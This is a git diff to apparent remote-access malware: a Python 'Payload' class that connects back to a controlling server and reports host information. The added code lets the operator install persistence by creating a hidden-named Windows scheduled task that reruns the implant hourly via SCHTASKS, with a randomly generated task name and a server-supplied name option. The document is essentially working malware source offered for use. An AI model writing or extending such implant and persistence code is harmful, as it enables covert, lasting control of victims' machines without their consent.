@@ -12,11 +12,17 @@ import threading
 import inspect
 import sys
 import time
+import random
+import string
 from ftplib import FTP
 
 # pour la compil
 import imp
 
+def getString(length=6):
+    """Générer une chaîne aléatoire de longueur fixe"""
+    str = string.ascii_lowercase
+    return ''.join(random.choice(str) for i in range(length))
 
 def _async_raise(tid, exctype):
     """raises the exception, performs cleanup if needed"""
@@ -74,6 +80,7 @@ class Payload:
             conn_ok = False
             ClientSocket = socket.socket()
             print('Waiting for connection')
+            name = None
             while conn_ok == False:
 
                 try:
@@ -93,6 +100,16 @@ class Payload:
             {info[3]}{self.SEPARATOR}{info[4]}{self.SEPARATOR}{info[5]}{self.SEPARATOR}{info[6]}{self.SEPARATOR}\
             {info[7]}{self.SEPARATOR}{info[8]}{self.SEPARATOR}{info[9]}"
             ClientSocket.send(message.encode())
+
+            ## attend des info supplementaire
+
+            try:
+                rep = ClientSocket.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
+                if rep != "RAS":
+                    name = rep
+            except socket.error as e:
+                print(str(e))
+                break
 
             pers = Persistance()
 
@@ -227,6 +244,23 @@ class Payload:
                         elif splited_command[1].lower() == "powershell":
                             print("Persistance via powershell")
                             output = "Persistance via powershell"
+
+                        elif splited_command[1].lower() == "task":
+                            print("Persistance via tache planifié")
+                            print(name)
+                            if name == None:
+                                result, code = pers._add_scheduled_task()
+                            else:
+                                result, code = pers._add_scheduled_task(name=name)
+                            if result == True:
+                                print("Persistance via tache planifié activé")
+                                output = "Persistance tache planifié activé" + code
+                                name = code
+                                print(code)
+                            if result == False:
+                                print(
+                                    "Persistance via tache planifié a rencontrer une erreur")
+                                output = "Persistance tache planifié a rencontrer une erreur : " + code
 
                 else:
                     output = "Persistance a besoin d'une option"
@@ -419,6 +453,22 @@ class Persistance:
         except Exception as e:
             print('{} error: {}'.format(self._add_startup_file.__name__, str(e)))
         return (False, "error")
+
+    def _add_scheduled_task(self, value=None, name=None):
+        try:
+            value = sys.argv[0]
+            if name == None:
+                name  = getString(random.randint(6,11))
+            if value and os.path.isfile(value):
+                result  = subprocess.check_output('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, value), shell=True)
+                result = result.decode("cp850")
+                if 'SUCCESS' in result or 'réussie' in result:
+                    print(result)
+                    return (True, name)
+        except Exception as e:
+            print('Add scheduled task error: {}'.format(str(e)))
+            err = e
+        return (False, "Erreur : " + err)
 
 
 class Info:
